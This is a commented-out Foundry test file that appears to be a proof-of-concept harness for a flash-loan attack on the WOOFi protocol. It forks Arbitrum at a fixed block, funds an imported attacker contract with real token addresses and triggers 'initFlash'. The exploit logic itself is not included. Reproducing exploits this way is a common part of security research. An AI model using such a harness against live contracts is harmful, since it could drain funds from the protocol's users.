// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.19;

// import {Test, console} from "lib/forge-std/src/Test.sol";

// import {WOOFiAttacker} from "./flash.sol";

// import {IERC20} from 'lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol';

// contract WooFiPoC is Test {

//     WOOFiAttacker attacker = new WOOFiAttacker();
//     address constant USDC = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
//     address constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
//     address constant WOO = 0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b;

//     function setUp() public {
//         vm.createSelectFork("arb", 187381784);
//     }

//     function testPoc() public {
//         // perform the attack!
//         console.log("here");
//         vm.deal(address(attacker), 1e18);
//         IERC20(WETH).approve(address(attacker), 1e18);
//         IERC20(WOO).transfer(address(attacker), 1e18);
//         IERC20(WETH).transfer(address(attacker), 1e18);
//         IERC20(USDC).transfer(address(attacker), 1e18);
        
//         attacker.initFlash();
//     }
// }
